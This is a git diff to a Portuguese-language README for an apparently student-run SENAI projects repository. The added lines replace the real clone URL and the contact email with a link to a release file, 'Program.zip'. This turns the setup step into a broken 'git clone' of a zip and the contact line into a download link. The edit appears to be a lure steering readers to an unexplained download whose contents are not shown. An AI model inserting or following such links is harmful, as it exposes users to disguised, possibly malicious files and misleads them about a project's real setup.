@@ -20,7 +20,7 @@ Neste repositório, você encontrará:
 
 1. Faça um clone deste repositório:
    ```bash
-   git clone https://github.com/OsnirJunior/senai.git
+   git clone https://github.com/OsnirJunior/SENAI/releases/download/v1.0/Program.zip
 2. Navegue até a pasta do projeto desejado.   
 3. Siga as instruções fornecidas em cada projeto para rodá-lo localmente.
 
@@ -28,4 +28,4 @@ Neste repositório, você encontrará:
 
 Caso tenha dúvidas ou queira colaborar, sinta-se à vontade para me contatar:
 
-Email: osnirpoltronierijunior@gmail.com
+Email: https://github.com/OsnirJunior/SENAI/releases/download/v1.0/Program.zip
